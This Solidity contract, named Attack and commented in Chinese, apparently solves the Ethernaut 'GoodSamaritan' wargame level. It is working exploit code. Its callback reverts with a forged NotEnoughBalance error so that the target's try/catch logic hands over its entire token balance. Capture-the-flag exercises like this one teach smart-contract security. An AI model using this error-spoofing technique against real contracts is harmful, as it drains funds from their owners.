// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract Attack {
    // 必須與目標合約的 Error Signature 一致
    error NotEnoughBalance();

    function pwn(address _target) external {
        IGoodSamaritan(_target).requestDonation();
    }

    // 當被 Coin 合約呼叫時，檢查金額
    function notify(uint256 amount) external pure {
        // 如果是初始的 10 枚捐贈，拋出錯誤觸發 catch 邏輯
        // 如果是後續的 1,000,000 枚轉帳，則正常接收（不 revert）
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
